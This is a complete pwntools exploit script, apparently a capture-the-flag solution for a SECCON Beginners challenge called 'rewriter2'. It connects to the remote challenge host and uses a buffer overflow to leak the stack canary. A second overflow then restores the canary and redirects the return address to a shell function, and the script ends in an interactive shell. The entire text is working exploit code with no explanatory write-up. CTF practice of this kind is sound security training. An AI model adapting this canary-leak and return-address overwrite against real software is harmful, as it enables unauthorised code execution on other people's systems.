from pwn import *

host = 'rewriter2.beginners.seccon.games'
port = 9001
elf = ELF('./rewriter2')
shell_addr = 0x4012d6

#io = process(elf.path)
io = remote(host, port)

payload = b'a' * 0x28
payload += b'!'
io.sendafter(b'name? ', payload)

io.recvuntil(b'a!')
canary = u64(b'\x00' + io.recv(7))

payload = b'a' * 0x28
payload += p64(canary)
payload += b'a' * 0x8
payload += p64(shell_addr)
io.sendafter(b'you? ', payload)

io.interactive()
